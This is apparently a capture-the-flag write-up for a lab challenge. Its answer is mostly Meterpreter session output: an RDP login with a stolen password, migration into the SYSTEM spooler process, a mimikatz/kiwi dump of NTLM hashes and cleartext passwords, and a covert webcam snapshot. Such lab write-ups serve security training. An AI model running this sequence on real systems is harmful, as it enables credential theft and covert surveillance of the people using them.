# Looking Back AT Yourself

## Points 300

Good work finding a way into the next target!

Have you looked in the mirror lately?

You will find a way to your next target on this machine, as well. You're almost to the end of this series. Don't stop now!

(There is a flag note you must retrieve)

(The path to your next challenge is provided after successful compromise)

(This target will reset every 60 minutes, at the start of the hour)


## Answer

```
root@kali:~# xfreerdp /u:susan.stone.local /p:hunter24LIFE /v:10.110.25.31
```


```
meterpreter > ps -S spool
Filtering on 'spool'

Process List
============

 PID   PPID  Name         Arch  Session  User                 Path
 ---   ----  ----         ----  -------  ----                 ----
 1360  688   spoolsv.exe  x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\spoolsv.exe

meterpreter > migrate 1360
[*] Migrating from 2656 to 1360...
[*] Migration completed successfully.
meterpreter > load mimikatz 
Loading extension mimikatz...Success.
meterpreter > load kiwi 
Loading extension kiwi...

  .#####.   mimikatz 2.1.1 20170608 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour"
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
  '#####'    Ported to Metasploit by OJ Reeves `TheColonial` * * */

Success.
meterpreter > creds_all 
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username           Domain          NTLM                              SHA1
--------           ------          ----                              ----
SHOWMECORP-02A$    SHOWMECORP      ba63b0a06bc183d55e07ea6875233974  9c36b4b7bd4fb84026467ba74eb9ffef2e48a859
susan.stone.adm    SHOWMECORP      6b126aa4b3e76b07bf53ab13c9b28349  04c99a34c04d77cb229d3bff8cf574baf6386b75
susan.stone.local  SHOWMECORP-02A  084d6c15b5ae0e4743d30bd2e2bfb9bc  636c860a24c6c3fa8458a3938bf3de2568774d54

wdigest credentials
===================

Username           Domain          Password
--------           ------          --------
(null)             (null)          (null)
SHOWMECORP-02A$    SHOWMECORP      e85NU<!IYT'zLjYf!dv^nqS>PX(Oy"'aN'E&6>G+Wh$e\a^WmP'?ow-SrhDdL:h\MAB?5x\994DZ;s;F`Sx1ED#T;^Z9kZ8/kKjryWKnU\; y=1#$_N9j#;w
susan.stone.adm    SHOWMECORP      fluffybunny123!!!
susan.stone.local  SHOWMECORP-02A  hunter24LIFE

kerberos credentials
====================

Username           Domain            Password
--------           ------            --------
(null)             (null)            (null)
showmecorp-02a$    SHOWMECORP.LOCAL  (null)
susan.stone.adm    SHOWMECORP.LOCAL  (null)
susan.stone.local  SHOWMECORP-02A    (null)



```

```
meterpreter > webcam_list 
1: VirtualBox Webcam - Integrated_Webcam_HD: Integrate
meterpreter > webcam_snap 
[*] Starting...
[+] Got frame
[*] Stopped
Webcam shot saved to: /root/DMBbHpiS.jpeg

```

![](files/DMBbHpiS.jpeg)